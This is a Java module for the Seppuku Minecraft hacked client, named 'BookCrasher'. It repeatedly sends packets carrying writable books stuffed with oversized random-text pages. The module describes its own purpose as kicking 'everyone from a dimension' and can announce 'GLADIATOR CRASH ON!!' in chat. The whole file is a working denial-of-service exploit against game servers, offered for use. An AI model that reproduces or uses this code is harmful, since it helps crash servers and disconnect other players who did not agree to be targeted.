package edu.gamayun.modules;

import me.rigamortis.seppuku.Seppuku;
import me.rigamortis.seppuku.api.module.Module;
import me.rigamortis.seppuku.api.value.Value;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;

import java.util.Random;
/**
 *
 * Advanced NBT data spamming using books.
 *
 * @author Zim The Destoryer
 * @date 2/25/20
 **/
public class BookCrashModule extends Module {
    private final Value<Mode> Switch = new Value<>("Mode", new String[]{"m"}, "switch between modes", Mode.WindowClick);
    public final Value<Boolean> chat = new Value("PublicChat", new String[]{"Chat"}, "Says in chat BOOK CRASH ENABLED!.", true);

    private final Value<Long> delay = new Value<>("delay", new String[]{"dly"}, "Customize delay between packets",5L, 1L, 500L,5L);
    private final Value<Integer> strLength = new Value<>("strLength", new String[]{"l"}, "Customize string length of each book page", 600, 450, 655, 100);
    private Packet packet;
    private String pages = "";
    private boolean flag = true;

    public BookCrashModule(){
        super("BookCrasher", new String[]{ "bcrash", "nbtcrash", "bookcrash" }, "Spams NBT data of a book to kick everyone from a dimension", "NONE", -1, ModuleType.EXPLOIT);
    }

    public void onEnable(){
        super.onEnable();
        if (this.chat.getValue() && mc.world != null) {
            Seppuku.INSTANCE.getChatManager().add(" GLADIATOR CRASH ON!!");
        }
        pages = genRandomString(strLength.getValue());
        runThread();
        flag = true;
    }

    public void onDisable(){
        super.onDisable();
        pages = "";
        flag = false;
    }

    private void runThread(){
        (new Thread(() -> {
            try{
                Minecraft mc = Minecraft.getMinecraft();
                ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                NBTTagList list = new NBTTagList();
                NBTTagCompound tag = new NBTTagCompound();
                String author = Minecraft.getMinecraft().getSession().getUsername();

                for (int i = 0; i < 50; i++) {
                    NBTTagString tString = new NBTTagString(pages);
                    list.appendTag(tString);
                }
                tag.setString("author", author);
                tag.setString("title", "\n ZimCRASH \n");
                tag.setTag("pages", list);
                bookObj.setTagInfo("pages", list);
                bookObj.setTagCompound(tag);
                if(Switch.getValue() == Mode.ConsoleSpammer){
                    pages = genRandomString(8192);
                    strLength.setValue(8192);
                    delay.setValue(225L);
                }
                while(flag){
                    switch (Switch.getValue()){
                        case CreativeInventory:
                            packet = new CPacketCreativeInventoryAction(0, bookObj);
                        case WindowClick:
                            packet = new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0);
                        case ConsoleSpammer:
                            packet = new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0);
                    }
                    mc.player.connection.sendPacket(packet);
                    Thread.sleep(delay.getValue());
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        })
        ).start();
    }
    private String genRandomString(Integer Length) {
        String SALTCHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        StringBuilder salt = new StringBuilder();
        Random rnd = new Random();
        while (salt.length() < Length) {
            int index = (int) (rnd.nextFloat() * SALTCHARS.length());
            salt.append(SALTCHARS.charAt(index));
        }
        String saltStr = salt.toString();
        return saltStr;
    }
    private enum Mode {
        CreativeInventory, WindowClick, ConsoleSpammer
    }
}
